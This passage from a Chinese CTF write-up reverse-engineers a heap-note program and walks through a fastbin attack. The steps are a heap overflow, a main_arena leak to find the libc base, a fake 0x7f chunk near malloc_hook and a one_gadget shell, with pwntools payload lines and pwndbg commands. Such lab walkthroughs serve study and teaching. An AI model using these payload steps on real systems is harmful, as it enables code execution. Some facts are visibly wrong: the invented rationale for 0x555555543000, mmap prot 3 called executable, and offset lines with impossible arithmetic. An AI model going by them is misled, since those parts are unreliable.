的页面边界上，以便后续的内存操作更高效地进行。<br>​    最后，整个表达式的结果被强制转换为一个 <code>char*</code> 类型的指针，并赋值给 <code>addr</code> 变量。</p><blockquote><p>为什么是% 0x555555543000uLL ？</p><p>​    –<code>0x555555543000</code> 是一个用来作为程序基址的常数，它的选择是因为在 Linux x86-64 系统下，用户空间程序的地址范围是从 0x0000000000000000 到 0x7fffffffffffffff，其中从 0x0000000000000000 到 0x0000555555555540 之间的地址空间是由程序本身使用的，而从 0x0000555555555540 开始的地址空间是留给系统库和其他用户空间程序使用的。因此，在这个代码中，使用 <code>0x555555543000</code> 这个值来作为程序基址可以避免与系统库和其他程序的地址空间冲突。并且，在计算内存地址时，使用取模运算 <code>%</code> 可以将偏移量限制在程序地址空间内。</p><p>为什么是% 0xE80uLL ？</p><p>​    –用来限制偏移量的范围</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mmap(addr, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>)</span><br></pre></td></tr></table></figure><p>​    简单来说就是从addr地址起，分配一页(0x1000字节)<mark>可读可写可执行</mark>的区域。</p><h4 id="SizeChoice函数"><a href="#SizeChoice函数" class="headerlink" title="SizeChoice函数"></a>SizeChoice函数</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230505/c2yb8erimage.2czzd8e23uhw.png"></p><h4 id="sub-123D函数–-gt-read-one-by-one函数"><a href="#sub-123D函数–-gt-read-one-by-one函数" class="headerlink" title="sub_123D函数–&gt;read_one_by_one函数"></a>sub_123D函数–&gt;read_one_by_one函数</h4><p><code>SizeChoice</code>函数中还有一个名为<code>sub_123D</code>的函数，我们点开看看：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230505/c2yb8erimage.4i4gxo2mmtg0.png"></p><p>​    定义了三个局部变量：v3用于存储循环次数，buf用于存储读取到的字符，v6用于存储read函数的返回值。<br>​    进入循环后，每次循环通过read函数从标准输入中读取一个字符，并判断该字符是否为换行符（’\n’）。如果读取到的字符为换行符，则跳出循环。如果读取到的字符不为换行符，则将该字符存储到a1（也就是ptr）指向的内存中，并将v5加1表示已经读取的字节数增加了1。如果read函数返回值小于等于0，表示出现了错误，此时通过<code>*_errno_location()</code>函数获取错误码并判断是否为<code>EAGAIN</code>或<code>EINTR</code>，如果不是则跳出循环。<br>​    最后，将a1指向的内存中第v5个字节设置为’\0’表示字符串结束，并返回实际读取的字节数v5。</p><p>​    <strong>一言概之，这个函数就是安全地向ptr中写入8个字节并且加上换行符.</strong></p><h4 id="Allocate函数"><a href="#Allocate函数" class="headerlink" title="Allocate函数"></a>Allocate函数</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230505/c2yb8erimage.3o2n9qvb9l00.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// _DWORD* 是一个指向 DWORD 类型的指针，其中 DWORD 是一个 32 位无符号整数类型</span></span><br><span class="line"><span class="comment">// _QWORD * 表示指向 unsigned long long 类型的指针，即 64 位整数类型的指针。</span></span><br><span class="line">v3 = <span class="built_in">calloc</span>(v2, <span class="number">1uLL</span>);</span><br></pre></td></tr></table></figure><p>​    <code>    calloc()</code> 函数是 C 语言标准库中的动态内存分配函数之一，用于在堆上分配一块大小为 <code>v2</code> 字节（即 <code>v2</code> 个字节）的内存，并将这块内存的每个字节都初始化为 0。函数的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> nmemb, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure><p>​    其中，<code>nmemb</code> 表示需要分配的元素个数，<code>size</code> 表示每个元素的大小，函数返回一个指向新分配内存的指针，如果分配失败则返回 <code>NULL</code>。</p><p>​    在上述代码中，<code>v2</code> 代表需要分配的字节数，<code>1uLL</code> 表示每个元素的大小为 1 字节，所以 <code>calloc()</code> 函数分配了 <code>v2</code> 个字节的内存，并将这些字节全部初始化为 0。最终将分配得到的指针存储在 <code>v3</code> 变量中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)(<span class="number">0x18</span>LL * i + a1) = <span class="number">1</span>;</span><br><span class="line">*(_QWORD *)(a1 + <span class="number">0x18</span>LL * i + <span class="number">8</span>) = v2;</span><br><span class="line">*(_QWORD *)(a1 + <span class="number">0x18</span>LL * i + <span class="number">16</span>) = v3;</span><br></pre></td></tr></table></figure><ul><li>第一行将指定索引对应的内存块<mark>标记</mark>为已分配，以示该内存块已被占用。</li><li>第二行将该<mark>内存块的大小</mark>存储到指定索引对应的位置中，方便释放时使用。</li><li>第三行将该<mark>内存块的指针</mark>存储到指定索引对应的位置中，方便释放时使用。</li></ul><p><strong>注意，最多只能分配16块内存块。</strong></p><h4 id="Fill函数"><a href="#Fill函数" class="headerlink" title="Fill函数"></a>Fill函数</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230505/c2yb8erimage.47znt11n1ho0.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">int</span>)result + a1);</span><br><span class="line"><span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br></pre></td></tr></table></figure><p>​    还记得我们刚刚Allocate函数中的标记位置吗？这里就是检测我们要操作的堆块是否是已经被分配了的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> sub_11B2(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), v3);</span><br></pre></td></tr></table></figure><p>​    这里出现了一个新的函数(我将它重新命名为<code>ensure_read</code>)，参数1就是我们指向堆块首地址的指针，参数2就是我们即将要输出content的长度。让我们点进去这个函数看看它干了什么：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230505/c2yb8erimage.2mc1fxxua500.png"></p><p>​    <strong>一言概之，这个函数就是保证我们能够输入我们要求大小的content.</strong>    </p><h4 id="Free函数"><a href="#Free函数" class="headerlink" title="Free函数"></a>Free函数</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230505/c2yb8erimage.3233e6pcm6m0.png"></p><p>​    当你把Allocate函数分析弄明白后，Free函数的机制你就应该能够轻松掌握。</p><p>​    首先判断我们要释放的堆块是否是被分配过的，然后修改标志和大小，最后将指向堆块的指针设置为<code>NULL</code>。</p><p>​    这里的free函数做的比较规范，所以不存在<code>UAF漏洞</code>。</p><h4 id="Dump函数"><a href="#Dump函数" class="headerlink" title="Dump函数"></a>Dump函数</h4><p><img lazyload alt="image" data-src="/home/c2yb8er/Typora/images/image-20230505225935108.png"></p><p>​    同理先判断传入的指针所对应的堆块状态，然后我们发现了又一个新函数，参数1为堆块指针，参数2为堆块大小。现在我们点进去看看这个函数做了什么：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230505/c2yb8erimage.6a1a1c50mhs0.png"></p><p>​    与前面的<code>ensure_read函数</code>如出一辙，只不过是read改为write，故不多解释了。</p><h3 id="1-漏洞成因："><a href="#1-漏洞成因：" class="headerlink" title="1.漏洞成因："></a>1.漏洞成因：</h3><p>​    在详细分析整个程序流程后，这个程序的漏洞点在哪里呢？</p><p>​    比较显然的堆溢出漏洞。虽然在Allocate函数中对size有所限制，但是在Fill函数中却没有对size有所限制。</p><h3 id="2-思路："><a href="#2-思路：" class="headerlink" title="2.思路："></a>2.思路：</h3><ol><li><p>先分配5个堆块：0x10，0x10，0x10，0x10，0x80。</p><p>分别记为chunk1,chunk2,chunk3,chunk4,chunk5。下标分别为[0,1,2,3,4]</p></li><li><p>free掉chunk3和chunk2</p></li><li><p>这个时候的fastbin：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先free(2)再free(1)</span></span><br><span class="line">fastbin:</span><br><span class="line">0x20:chunk2-------&gt;chunk3--------&gt;0</span><br></pre></td></tr></table></figure></li><li><p>我们需要泄露基地值，泄露基地值的方法就是找main_arena,如何找到main_arena呢？通过unsorted bins来找到。当我们把chunk5释放出去后，chunk5就会指向unsorted bins中的地址，而unsorted bin的地址与main_arena的地址偏移是固定的，这里我们将通过堆溢出来实现通过其他chunk也就是chunk2偷天换日也指向chunk5从而获取main_arena泄露基地址。(至于为什么是chunk2，我们等一下再说)</p><p>堆块区域大致如下：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------</span><br><span class="line">pre | size  </span><br><span class="line">fd  | bk &lt;---chunk1</span><br><span class="line">content</span><br><span class="line">------------------------------------------</span><br><span class="line">pre | size  </span><br><span class="line">fd  | bk &lt;---chunk2（free）</span><br><span class="line">content</span><br><span class="line">------------------------------------------</span><br><span class="line">pre | size  </span><br><span class="line">fd  | bk &lt;---chunk3（free）</span><br><span class="line">content</span><br><span class="line">------------------------------------------</span><br><span class="line">pre | size  </span><br><span class="line">fd  | bk &lt;---chunk4</span><br><span class="line">content</span><br><span class="line">------------------------------------------</span><br><span class="line">pre | size </span><br><span class="line">fd  | bk &lt;---chunk5</span><br><span class="line">content</span><br><span class="line">------------------------------------------</span><br><span class="line">top chunk</span><br></pre></td></tr></table></figure><ol start="5"><li><p>这里实现起来先要将chunk2利用起来，由于Fill函数会检查堆块是否还在使用，所以要修改chunk2或者chunk3，就必须通过还在使用的chunk1。由于chunk2与chunk1临近，修改起来比较方便故这里利用堆溢出修改chunk2使得其fd指向chunk5。这样我们在释放chunk5之后就有了可以利用chunk5的媒介了。</p></li><li><p>但是这里不能直接释放chunk5，因为此时的chunk5的大小为0x90，已经超过了fast bin的最大接收范围，同样的道理，我们通过还在使用的chunk4来修改chunk5的大小为0x20，从而能使其进入fast bin的0x20这条链进行利用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastbin:</span><br><span class="line">0x20:chunk2----&gt;chunk5</span><br></pre></td></tr></table></figure></li><li><p>开始利用fast bin的0x20这条链，重新申请两个0x20大小的chunk。重启后原本chunk2部分正常重启chunk2，但是原本chunk3部分却是指向了chunk5。</p></li><li><p>现在chunk5的大小被修改成为了0x20，如果被释放将不满足进入unsorted bin的条件，所以得把大小改回来。</p></li><li><p>改回来之后，还是不能马上释放chunk5，因为我们发现chunk5现在紧邻top_chunk，如果直接释放将会和top chunk合并而不是进入unsorted bin中，为此我们还得再申请一个chunk6。这个chunk6的大小为多少不影响。</p></li><li><p>释放chunk5，此时chunk3等效于chunk5，去掉偏移后，我们就可以得到main_arena的地址，然后计算基地址，利用one_gadget。</p></li><li><p>还是得狠狠地榨干chunk5的利用价值，我们再重新申请一块0x70大小的chunk，此时的chunk7会出现在原来的chunk5也就是id=4的位置，还记得我们的chunk3吗？chunk3是可以控制能够chunk5这块地址的，所以我们如果把chunk7再释放了，就可以通过chunk3修改chunk7。</p></li><li><p>通过chunk3修改chunk7，将其fd指向一个我们伪造的fake chunk。这个chunk7是我们精心选择的，此时在fastbin：0x70这条链子上我们就能发现：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastbin：</span><br><span class="line">0x70: chunk7---------&gt;fake_chunk</span><br></pre></td></tr></table></figure><ol start="13"><li><p>此时再申请两个0x70大小的chunk将启用chunk7和fake_chunk!</p><p>我们再来看一下现在的chunk情况：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------</span><br><span class="line">pre | size  </span><br><span class="line">fd  | bk &lt;---chunk1</span><br><span class="line">content</span><br><span class="line">------------------------------------------</span><br><span class="line">pre | size  </span><br><span class="line">fd  | bk &lt;---chunk2（reuse:chunk2）</span><br><span class="line">content</span><br><span class="line">------------------------------------------</span><br><span class="line">pre | size  </span><br><span class="line">fd  | bk &lt;---chunk3（reuse:chunk5）</span><br><span class="line">content</span><br><span class="line">------------------------------------------</span><br><span class="line">pre | size  </span><br><span class="line">fd  | bk &lt;---chunk4</span><br><span class="line">content</span><br><span class="line">------------------------------------------</span><br><span class="line">pre | size </span><br><span class="line">fd  | bk &lt;---chunk5 (reuse:chunk7)</span><br><span class="line">content</span><br><span class="line">------------------------------------------</span><br><span class="line">pre | size </span><br><span class="line">fd  | bk &lt;---chunk6</span><br><span class="line">content</span><br><span class="line">------------------------------------------</span><br><span class="line">pre | size </span><br><span class="line">fd  | bk &lt;---fake_chunk</span><br><span class="line">content</span><br><span class="line">------------------------------------------</span><br><span class="line">top chunk</span><br></pre></td></tr></table></figure><ol start="14"><li>由于如果成功将one_gadget地址写入到<code>malloc_hook</code>位置，那么当下一次调用<code>malloc</code>函数时，它将会尝试执行<code>malloc_hook</code>指向的地址，即one_gadget。所以我们现在的任务就是要将<code>malloc_hook</code>的地址处写上我们的one_gadget地址，由于fake chunk与malloc_hook的偏移是固定的所以这一点很容易做到！</li><li>申请任意大小的chunk，让执行malloc_hook所指向的地址也就是one_gadget，从而getshell！</li></ol><h3 id="3-流程："><a href="#3-流程：" class="headerlink" title="3.流程："></a>3.流程：</h3><h4 id="查看mmap函数分配地址及其内容："><a href="#查看mmap函数分配地址及其内容：" class="headerlink" title="查看mmap函数分配地址及其内容："></a>查看mmap函数分配地址及其内容：</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.2mdppaw8yu20.png"></p><p><img lazyload alt="image" data-src="/home/c2yb8er/Typora/images/image-20230506192524242.png"></p><h4 id="泄露unsortbin-addr地址"><a href="#泄露unsortbin-addr地址" class="headerlink" title="泄露unsortbin_addr地址"></a>泄露unsortbin_addr地址</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.6eukpsjy1f00.png"></p><pre><code> free过后：</code></pre><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.2ve91pv3ktw0.png"></p><h5 id="修改chunk2的fd使得其指向为chunk5"><a href="#修改chunk2的fd使得其指向为chunk5" class="headerlink" title="修改chunk2的fd使得其指向为chunk5"></a>修改chunk2的fd使得其指向为chunk5</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Fill(0,b&#x27;a&#x27;*0x10 + p64(0) + p64(0x21) + p8(0x80))</span><br><span class="line"># 注意这里最后只覆盖低四位，故用p8()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.4fngitfvry80.png"></p><p>​    可以看到，已经修改成功：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.38kqz68rcga0.png"></p><blockquote><p>​    可以看到覆盖后fastbin中就变成了chunk2 –&gt; chunk5。那么接下来如果我们想要对chunk5进行操作的话，就需要重启fastbin中chunk2指向的chunk5，但是由于chunk5的size是0x90而不是0x20，所以即使chunk5的chunk指针在fastbin的0x20单项链表中我们也是无法启用的。所以我们还需要通过向chunk4中写溢出数据，使其覆盖chunk5的size为0x20，我们才能够重新启用chunk5。<br>————————————————<br>原文链接：<a class="link" href="https://blog.csdn.net/qq_41202237/article/details/112320919">https://blog.csdn.net/qq_41202237/article/details/112320919<i class="fas fa-external-link-alt"></i></a></p></blockquote><h5 id="修改chunk5的size大小，从而能够在fastbin-0x20这条链上操作："><a href="#修改chunk5的size大小，从而能够在fastbin-0x20这条链上操作：" class="headerlink" title="修改chunk5的size大小，从而能够在fastbin:0x20这条链上操作："></a>修改chunk5的size大小，从而能够在fastbin:0x20这条链上操作：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fill(3,p64(0)*3 + p64(0x21))</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.2idd5zvcgoi0.png"></p><h5 id="操作fastbin-0x20这条链"><a href="#操作fastbin-0x20这条链" class="headerlink" title="操作fastbin:0x20这条链"></a>操作fastbin:0x20这条链</h5><blockquote><p>​    接下来我们只需要重新申请两个0x20大小的chunk，第一次申请0x20会重新启用fastbin中0x20单项链表尾部的chunk2，第二次申请0x20就会启用fastbin中0x20单向链表剩下的chunk5：</p></blockquote><p><img lazyload alt="image" data-src="/home/c2yb8er/Typora/images/image-20230506201759118.png"></p><blockquote><p>​    上述做了这么多的准备工作。我们想要的其实就是让id为2的结构体的第三成员变量指向chunk5，因为无论是打印还是填充数据，都是根据结构体第三成员变量找到的chunk。这样一来，我们接下来对id为2的chunk5进行操作，就等同与对id为4的chunk5进行操作。</p><p>​    前面说更改chunk5的size是为了重新启用它，但是一开始之所以将chunk5的size定义为0x90，是为了接下来释放chunk5的时候进unsortbin能让chunk5的fd指向unsortbin_addr。所以接下来我们还需要构建payload_for_chunk4对chunk4进行溢出，将chunk5的size改回0x90：</p></blockquote><h5 id="修改chunk5的size大小，从而能够在free后分配到unsorted-bin中："><a href="#修改chunk5的size大小，从而能够在free后分配到unsorted-bin中：" class="headerlink" title="修改chunk5的size大小，从而能够在free后分配到unsorted bin中："></a>修改chunk5的size大小，从而能够在free后分配到unsorted bin中：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fill(3,p64(0)*3 + p64(0x91))</span><br></pre></td></tr></table></figure><p>​    跟上述修改同理，就不贴图了。</p><h5 id="去除top-chunk对chunk5的影响"><a href="#去除top-chunk对chunk5的影响" class="headerlink" title="去除top_chunk对chunk5的影响:"></a>去除top_chunk对chunk5的影响:</h5><blockquote><p>​    可以看到经过对chunk4的溢出，chunk5的size重新改为0x90。但此时并不能直接进行去释放chunk5，<mark>因为只有不与top_chunk相邻的第一个释放chunk，其fd才会指向unsortbin_addr。</mark>chunk5现在是链接top_chunk的，所以我们还需要重新申请一个size为0x90大小的chunk之后再去释放chunk5：</p></blockquote><p>​    ————–》<strong> 疑问：可不可以不是0x90大小的chunk呢？</strong></p><p>​    经过尝试：可以，因为这个chunk只起分割chunk5与top chunk的作用后续将不做过多使用。故大小没有影响。</p><p>​    </p><h5 id="利用chunk5获取main-arena地址"><a href="#利用chunk5获取main-arena地址" class="headerlink" title="利用chunk5获取main_arena地址"></a>利用chunk5获取main_arena地址</h5><blockquote><p>​    接下来的操作就比较容易了，由于前面已经在id为2的结构体处部署了chunk5的chunk指针，所以接下来我们只需要调用程序中的dump()函数打印id为2的chunk内容，就可以把chunk5中的unsortbin_addr（fd）打印出来了！！！</p></blockquote><p>​    free掉chunk5后我们发现其指向了main_arena的地址：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.6u1n3c6zfos0.png"></p><p>​    我一开始还在疑惑为什么有两个泄露的基地址，仔细一看原来是此时chunk5的fd和bk都是泄露的(main_arena+88)</p><p><strong>—–&gt;在学完Unsorted bin后来看这一点，我发现是这里是理解错了，我当时没有理解好Unsorted bin中的结构是什么样子：双向链表！</strong></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230507/c2yb8erimage.3f3vqau81o80.png"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.567xs1doqb40.png"></p><pre><code>然后就是正常的泄露基地址，但是要注意的是：</code></pre><p>​    unsortbin_addr与main_arena之间的偏移是固定的88<br>​    main_arena与libc基地址的偏移是固定的0x3c4b20<br>​    这样一来我们就得到了libc的基地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c.recvuntil(b&#x27;Content: \n&#x27;)</span><br><span class="line">main_arena_88_addr = u64(c.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">main_arena_addr = main_arena_88_addr - 88</span><br><span class="line">loghex(main_arena_addr,&#x27;The Leak Addr :&#x27;)</span><br><span class="line">libcbase = main_arena_addr - 0x3c4b20</span><br></pre></td></tr></table></figure><p>​    这里我参考的文章的作者用了这段代码来计算这个固定值88:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#需要提前指定你的计算机架构</span><br><span class="line">def offset_bin_main_arena(idx):</span><br><span class="line">    word_bytes = context.word_size / 8</span><br><span class="line">    offset = 4  # lock</span><br><span class="line">    offset += 4  # flags</span><br><span class="line">    offset += word_bytes * 10  # offset fastbin</span><br><span class="line">    offset += word_bytes * 2  # top,last_remainder</span><br><span class="line">    offset += idx * 2 * word_bytes  # idx</span><br><span class="line">    offset -= word_bytes * 2  # bin overlap</span><br><span class="line">    return offset</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.1dutgpb9amrk.png"></p><p>​    但是我不太明白为什么要这样做，为理解的这个88是我们在unsorted bin中那条chunk5指向的链中标出来的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">all: 0x55d6f4207080 —▸ 0x7f1725bc4b78 (main_arena+88) ◂— 0x55d6f4207080</span><br></pre></td></tr></table></figure><p>​    这里是<code>(main_arena+88)</code>，如果要得到main_arena_addr就需要减去88。不知道我这样想对不对。</p><h4 id="Try-to-Getshell！"><a href="#Try-to-Getshell！" class="headerlink" title="Try to Getshell！"></a>Try to Getshell！</h4><p>​    </p><h5 id="new-一个chunk7"><a href="#new-一个chunk7" class="headerlink" title="new 一个chunk7"></a>new 一个chunk7</h5><blockquote><p>​    在得到libc基地址之后就是进行malloc_hook了,我们需要在malloc_hook附近寻找一个可用的fake_chunk，这个fake_chunk需要满足两点要：</p><p>​        size大小为0x70 - 0x7F之间（有利于用错字节找到fake_chunk）<br>​        fake_chunk的内容部分必须包含malloc_hook的地址（在填充fake_chunk内容的同时修改malloc_hook）</p></blockquote><p>———-&gt;为什么要对size进行这个约束？</p><blockquote><p>​    由于size的原因，我们需要先申请一个size为0x70的chunk7，并将其释放进fastbin的0x70单项链表。这里需要注意的的释放的目标，在泄露unsortbin_addr部分最后，我们释放了id为4的chunk5，从而泄露出unsortbin_addr。那么重新申请size为0x70的chunk7的时候，chunk7会放在id为4的位置，所以申请后再次释放的应该是id4：</p></blockquote><p><img lazyload alt="image" data-src="/home/c2yb8er/Typora/images/image-20230506210742518.png"></p><p>​    可以看出新分配是从被free的chunk5中重启用的。</p><p>​    再次释放：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.2k1tm4xko3s0.png"></p><h5 id="通过修改重启的chunk5来修改chunk7"><a href="#通过修改重启的chunk5来修改chunk7" class="headerlink" title="通过修改重启的chunk5来修改chunk7"></a>通过修改重启的chunk5来修改chunk7</h5><blockquote><p>​    这样一来我们就有承接fake_chunk的chunk7了，此时的chunk7的fd指针指向的是NULL。还记得前半部分在id为2的位置部署的chunk5吗，此时chunk7由于被放在了id为4原来chunk5的位置，chunk7的chunk地址与chunk5的地址指向的是同一个位置，所以对id为2的chunk5进行操作，也就相当于对chunk7进行操作。</p></blockquote><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.51xubemtcig0.png"></p><blockquote><p>​    所以我们只需要向id为2的chunk5中填充fake_chunk的地址，那么chunk7的fd位置就会被覆盖成fake_chunk!</p></blockquote><h5 id="寻找fake-chunk的方法："><a href="#寻找fake-chunk的方法：" class="headerlink" title="寻找fake_chunk的方法："></a>寻找fake_chunk的方法：</h5><p>​    首先在gdb中输入下方命令查找main_arena的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (void*)&amp;main_arena</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.5772ursy1cg.png"></p><p>​    可以看到当前流程中main_arena的地址为<code>0x7fe7fedc4b20</code>。看一下<code>main_arena - 0x10</code>位置的malloc_hook：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.6lyohplnqk00.png"></p><p>​    可以看到malloc_hook的地址为<code>0x7fe7fedc4b10</code>，那么接下来使用pwndbg中的<code>find_fake_fast</code>函数和查找一下可以将malloc_hook作为内容地址的<code>0x70（0x7F）</code>大小的fake_chunk，使用下面的命令:</p><p>​    <code>(find_fake_fast+被写入地址+chunk大小)</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find_fake_fast 0x7fe7fedc4b10 0x7f</span><br></pre></td></tr></table></figure><p><strong>———-&gt;为什么是<code>0x70（0x7F）</code>大小的fake_chunk呢？</strong></p><ul><li>size大小为0x70 - 0x7F之间（有利于用错字节找到fake_chunk）</li></ul><p>​    我没有太理解这里的<code>有利于用错字节找到fake_chunk</code>是什么意思，贴一个chat回答的内容：</p><p>​    (经典chat，说了感觉又没说，bushi)</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.76ezsfchmo80.png"></p><p>​    可以看到pwndbg已经为我们找到了合适的fake_chunk：<code>0x7fe7fedc4aed</code>。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.3yjykrvrsvy0.png"></p><p><img lazyload alt="image" data-src="/home/c2yb8er/Typora/images/image-20230506213701686.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fake_offset_main = main_arena - fake_chunk = 0x7fe7fedc4b20 - 0x7fe7fedc4b10 = 0x33</span><br><span class="line">fake_offset_hook = malloc_hook_addr - fake_chunk = 0x7fe7fedc4b10 - 0x7fe7fedc4b10 = 0x23</span><br></pre></td></tr></table></figure><h5 id="续接上文修改chunk7"><a href="#续接上文修改chunk7" class="headerlink" title="续接上文修改chunk7"></a>续接上文修改chunk7</h5><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.2c0qd34wq3ms.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk_addr = main_arena_addr - 0x33 </span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">Fill(2,fake_chunk)</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" 